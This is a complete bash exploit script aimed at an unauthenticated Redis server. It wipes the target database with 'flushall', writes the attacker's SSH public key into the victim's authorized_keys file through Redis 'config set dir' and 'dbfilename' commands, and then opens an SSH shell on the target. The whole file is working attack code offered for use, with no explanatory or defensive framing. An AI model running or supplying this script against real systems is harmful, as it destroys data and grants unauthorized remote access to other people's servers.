#!/bin/bash

if [[ ! -f "/usr/bin/redis-cli" ]]; then
    echo "You need to install redis-cli for this exploit to work.";
    exit 1;
fi

if [[ $# -ne 4 ]]; then
    echo "Usage: $0 <ip> <port> <username> <remote .ssh dir>";
    exit 1;
fi

ip="$1"
port="$2"
username="$3"
remote_sshdir="$4"

if [[ ! -f "$HOME/.ssh/id_rsa.pub" ]]; then
    echo "SSH keys need to be generated";
    ssh-keygen -t rsa -b 4096 -C "$USER@$HOSTNAME";
fi

(echo -e "\n\n\n"; cat "$HOME/.ssh/id_rsa.pub"; echo -n "\n\n\n") > payload.txt

echo -n "Flushing keys from redis database..."
redis-cli -h "$ip" -p "$port" flushall
echo -n "Adding ssh key to redis database..."
cat payload.txt | redis-cli -h "$ip" -p "$port" -x set epic_gamer ; rm payload.txt ;
echo -n "Setting temporary database name..."
redis-cli -h "$ip" -p "$port" config set dbfilename "backup.db"
echo -n "Setting databse directory to $remote_sshdir..."
redis-cli -h "$ip" -p "$port" config set dir "$remote_sshdir"
echo -n "Setting database filename to authorized_keys..."
redis-cli -h "$ip" -p "$port" config set dbfilename "authorized_keys"
echo -n "Saving changes to database..."
redis-cli -h "$ip" -p "$port" save

echo "If all were OK, an ssh shell on $ip as $username should appear."
ssh ${username}@${ip}

exit 0

